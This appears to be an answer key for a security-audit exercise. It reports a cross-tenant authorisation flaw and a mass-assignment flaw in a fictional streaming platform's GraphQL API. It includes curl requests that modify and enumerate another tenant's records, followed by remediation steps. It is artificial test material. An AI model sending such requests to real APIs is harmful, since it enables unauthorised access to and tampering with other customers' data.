# Expected Response

## System
- Domain: Media / Streaming
- System: StreamCore VOD Platform
- Example ID: GQL-0069

## Priority Findings

### Finding 1: Cross-Tenant VOD Content Modification via Bulk List Endpoint (Pattern 1.3)
**Severity:** Critical
**Category:** BOLA

**Summary:**
Per §5.0 (Pattern 1.3 — bulk or list endpoints): The `updateResource` mutation lacks tenantId enforcement, allowing an attacker from `tenant-6c3e` to modify VOD content record `R-2069` belonging to `tenant-0051`. The attacker also injected `ownerId: "attacker-6c3e0051"` — a mass-assignment attack that transfers ownership of the victim's content record.

**Evidence from HAR:**
- Request: `POST https://api.streamcore-vod-plat.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-6c3e`
- Mutation: `updateResource(id: "R-2069", input: {status: "approved", ownerId: "attacker-6c3e0051"}) { resourceId status }`
- Response `200 OK`; cross-tenant data returned: `tenantId: "tenant-0051"`, `sensitiveField: "CONFIDENTIAL-6c3e0051"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-6c3e0051`

**Root Cause (§4.0 RISK-GQL-069):** `getResource` / `updateResource` resolvers fetch by ID only; bulk/list endpoints also expose cross-tenant data.

## Steps to Reproduce

### Step 1 — Cross-tenant content update with mass assignment (HAR)
```bash
curl -s -X POST https://api.streamcore-vod-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-6c3e" \
  -d '{"query": "mutation { updateResource(id: \"R-2069\", input: {status: \"approved\", ownerId: \"attacker-6c3e0051\"}) { resourceId status } }"}'
```
**Vulnerable:** Modifies `tenant-0051` content; returns updated record with leaked data. **Secure:** FORBIDDEN.

### Step 2 — Bulk enumeration of content records
```bash
curl -s -X POST https://api.streamcore-vod-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-6c3e" \
  -d '{"query": "query { listResources(tenantId: \"tenant-0051\") { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** `listResources` trusts client-supplied `tenantId`.

## Remediation
1. Resolver tenant guard on `updateResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` and `tenantId` from `ResourceInput` — never client-writable.
3. `listResources` must ignore client `tenantId` argument — always use JWT.tenantId.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
